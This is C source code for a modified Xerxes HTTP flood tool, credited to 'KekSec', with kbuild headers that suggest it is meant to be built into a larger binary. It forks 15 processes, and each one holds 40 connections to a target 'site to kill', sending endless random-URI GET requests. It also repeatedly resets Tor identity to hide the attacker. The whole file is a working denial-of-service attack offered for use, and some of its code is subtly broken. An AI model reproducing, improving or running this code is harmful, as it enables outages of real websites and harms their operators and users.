//kbuild:lib-$(CONFIG_XERSEXHTTP) += xersexhttp.o
//config:config XERSEXHTTP
//config:	bool "xersexhttp"
//config:	default y



//Xerxes, code assumed to be public domain
//by tH3j3st3r
// Modified by KekSec to do http attack


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
//#include "config.h"

int _attacks = 0;
int sizebuf; // initialize for tcp payload size
int sizebuf2;
/*
 * This function just abstracts sockets to an easier way of calling them.
 */

int _tcp_make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
//	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}

	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
		exit(0);
	}

	if(servinfo)
		freeaddrinfo(servinfo);
	//fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}





/*

 * Generic stop function

 */
void _tcp_broke(int s) {
	// do nothing

}


#define CONNECTIONS 40
#define THREADS 15


/*
 * This version of xersex sends HTTP get requests. The original xersex just sends null \0's. 
 * Original source below. For udp attacks, change the socket to a datagram above
*/

/*
 * This function will send a null character to the
 * target site, which wastes the daemon's time, and is
 * why this program works.
 */


/*
Generate a random string for random get requests. Makes it harder to filter them out.
*/
char string[];
int string_length;
int a=0;

static char * createStr() {
int string_length = rand() % 20 + 1;
int i = 0;
for( i = 0; i < string_length; ++i){
        string[i] = '0' + rand()%72; // starting on '0', ending on '}'
}
return string;
//printf("random data: %s\n",string);
}

void http_attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, g=1, r;
	for(x=0; x!= CONNECTIONS; x++)
		sockets[x]=0;
	signal(SIGPIPE, &_tcp_broke);
	printf("NOTICE %s :HTTP-Xerexing %s.\n", host);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = _tcp_make_socket(host, port);
			/* Null byte attack: r=write(sockets[x], "\0", 1); */

			/* HTTP get /random-uri Attack */
                        char *string = createStr();
                        char httpbuf[1024];
			/* Get /randomshiteverythread?lol=kektheplanet */
                        sprintf(httpbuf,"GET /%s HTTP/1.0\r\nUser-Agent: Wget/1.16 (linux-gnu/keksec)\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n",string);
                        printf("%s",httpbuf);
			char s_copy[128];
			strncpy(s_copy, httpbuf, sizeof(s_copy));
			int sizebuf = sizeof s_copy - 1;
			/* --- */
			r=write(sockets[x], s_copy, sizebuf);
			if(r == -1) {
				close(sockets[x]); 
				sockets[x] = _tcp_make_socket(host, port);
			} else {
			//fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
			}
			_attacks++;
			fprintf(stderr, "[%i:\tvolley sent, %d\t]\n", id, _attacks);
		}
		usleep(300000);
	}
}



/*

 * This function will reset your tor identity, VERY USEFUL

 */

void _tcp_cycle_identity() {
	int r;
	int socket = _tcp_make_socket("localhost", "9050");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
		usleep(300000);
	}
}




int main(int argc, char **argv) {
//it goes here
	srand(time(NULL));
	int x;
	if(argc !=3) {
		printf("xerxeshttp Usage Summary:\n%s [site to kill] [port, 80 is best]\nThis version uses http get requests instead of nulls.\nYour tor identity has been reset\n\n", argv[0]);
		_tcp_cycle_identity();
		return 0;
	}
	for(x=0; x != THREADS; x++) {
		if(fork())
			http_attack(argv[1], argv[2], x);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}
